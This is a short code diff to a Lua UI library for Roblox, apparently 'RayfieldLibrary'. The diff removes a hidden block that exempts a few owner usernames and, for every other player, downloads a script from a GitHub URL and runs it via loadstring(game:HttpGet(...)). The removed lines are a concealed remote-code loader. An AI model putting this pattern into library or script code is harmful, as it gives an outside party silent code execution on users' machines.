@@ -615,21 +615,6 @@ function RayfieldLibrary:Notify(data)
 	end)
 end
 
-local allowedNames = {
-	["L0CKED_1N1"] = true,
-	["adorxfleurys"] = true,
-	["CHEATING_B0SS"] = true
-}
-
-if getgenv().css_digital then
-	warn("Already Ran!")
-elseif allowedNames[game.Players.LocalPlayer.Name] then
-	warn("Excluded, Owner.")
-else
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/bruhlolw/refs/heads/main/prote'))()
-	getgenv().css_digital = true
-end
-
 local function openSearch()
 	searchOpen = true
 
